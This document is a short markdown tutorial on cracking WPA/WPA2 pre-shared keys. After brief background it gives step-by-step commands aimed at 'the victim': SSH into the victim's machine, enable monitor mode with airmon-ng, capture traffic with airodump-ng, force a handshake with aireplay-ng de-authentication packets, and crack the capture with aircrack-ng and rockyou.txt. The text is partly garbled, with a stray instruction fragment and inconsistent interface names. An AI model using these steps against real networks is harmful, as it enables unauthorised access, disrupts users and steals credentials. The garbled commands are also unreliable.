WiFi protected access.
WPA dinamically generate a new key for each packet.
WPA and WPA2 are frequently deployed with a pre-shared key, PSK, to secure communications between the access point and the wireless clients.
- The PSK should be a random pass phrase of at least 13 characters in length, if not, it is possible to determine the PSK using a Brute-Force Attack, by comparing the PSK to a known dictionary.

---
Start a WPA attack:
- Connect to the victim's machine by ssh
- List the available wireless interfaces installed on the victim's pc:
````
iwconfig
````
- Create a monitor interface using the airmon-ng command:
````
service network-manager stop

airmon-ng start wlanO

#check monitor mode is enabled
````
- List all the available access points in its range and find your target:
````
airodump-ng monO

#when you find your target press Ctrl+C to stop it
````
- Capture the traffic between the target access point and the client:
````
airodump-ng --bssid victim's_mac_address -c channel --showack -w wpa_log monO
````
(DO NOT CLOSE THIS WINDOW)
- Open another terminal to launch a de-authentication attack, which will force a user to re-authenticate to the target access point and re-exchange the WPA key:
````
aireplay-ng -0 20 -a  victim's_mac_address -c LOOK_DOWN_MAC mon0

#20 means that we will sen 20 de-authentication packets 
````
- Pick one and put it before:

- Let's make sure that we captured the 4 way handshake:
![](./img/4%20way%20handshake.png)
- Now stop this terminal using Ctrl+C
- Now, we need to crack some passwords
````
aircrack-ng wpa_log-01.cap -w /usr/share/wordlists/rockyou.txt
````
![](./img/passwords.png)
- We can also use **hashcat** or other tools to crack the passwords
